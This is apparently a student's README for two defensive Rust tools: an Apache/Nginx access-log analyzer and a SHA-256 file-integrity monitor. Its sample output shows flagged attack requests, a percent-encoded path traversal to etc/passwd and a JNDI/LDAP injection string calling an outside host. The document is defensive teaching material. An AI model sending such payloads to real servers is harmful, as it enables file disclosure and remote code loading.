# Rust security tools (cargo workspace)

## Goal

Learn Rust by building two small, safe, well-tested defensive tools:

| Crate | What it does |
|-------|--------------|
| [`log-analyzer`](crates/log-analyzer/) | Summarises Apache/Nginx *combined* access logs: top clients, status codes, clients with many errors (scanning), and requests matching transparent heuristics (path traversal incl. percent-encoded, sensitive files, admin-panel probes, scanner user agents, injection patterns). Standard library only. |
| [`fim`](crates/fim/) | Minimal **file-integrity monitor**: `baseline` records SHA-256 + size of every file under a directory; `check` reports **ADDED / REMOVED / MODIFIED** files. Does not follow symlinks. Uses the `sha2` crate. |

(Security+ D4 — file integrity monitoring, log analysis; D1 — integrity,
hashing.)

## Setup

```bash
# Install Rust if needed (https://rustup.rs)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
rustup component add clippy rustfmt

cd rust
cargo build --release
cargo test
cargo clippy --all-targets -- -D warnings
cargo fmt --all -- --check
```

`unsafe` code is forbidden workspace-wide (`[workspace.lints]`).

## Steps

### log-analyzer

```bash
cargo run -q -p log-analyzer -- --min-errors 3 samples/access.log.synthetic
sudo ./target/release/log-analyzer /var/log/nginx/access.log --top 20
```

Output on the synthetic sample (excerpt):

```text
Requests: 12  (malformed lines: 1)  bytes sent: 16902
Clients with >= 3 error responses:
  203.0.113.45 (6)
Flagged requests: 7
  [14/Sep/2026:21:05:03 +0000] 203.0.113.45 GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd -> 400 (path-traversal,sensitive-file,scanner-user-agent,injection-pattern)
  [14/Sep/2026:21:07:10 +0000] 198.51.100.23 GET /?x=${jndi:ldap://198.51.100.23/a} -> 400 (injection-pattern)
```

### fim

```bash
cargo build --release -p fim
sudo ./target/release/fim baseline /etc /var/lib/fim/etc.tsv     # store the baseline somewhere safe (ideally read-only / off-host)
sudo ./target/release/fim check    /etc /var/lib/fim/etc.tsv; echo "exit=$?"
```

Demo run on a scratch directory (edit `sshd_config`, delete `hosts`, drop a new cron file):

```text
$ fim check /tmp/demo /tmp/fim-baseline.tsv
ADDED     etc/cron.d-evil
REMOVED   etc/hosts
MODIFIED  etc/ssh/sshd_config
1 added, 1 removed, 1 modified, 0 unchanged
exit=1
```

Exit codes: `0` clean / baseline written, `1` changes detected, `2` error —
so it can run from cron or a systemd timer and alert on non-zero.

Limitations (on purpose, it's a learning project): no permission/owner/mtime
tracking, no signed baseline (an attacker with root could rewrite it — real
tools store baselines off-host or sign them), file names with tabs/newlines
are rejected.

### Tests

```text
$ cargo test
fim:          5 passed (SHA-256 test vectors, add/remove/modify detection, exclusions, TSV round-trip & validation, symlink loop)
log-analyzer: 6 passed (parsing, malformed lines, percent-decoding, classification, summary/report)
$ cargo clippy --all-targets -- -D warnings   -> no warnings
```

## Evidence

- `cargo test` / `cargo clippy` output (above; CI workflow runs them too).
- `fim check` output after modifying files in a lab VM's `/etc`, compared with
  the Wazuh FIM alert for the same change.

## What I learned

_To be completed by Lucas._
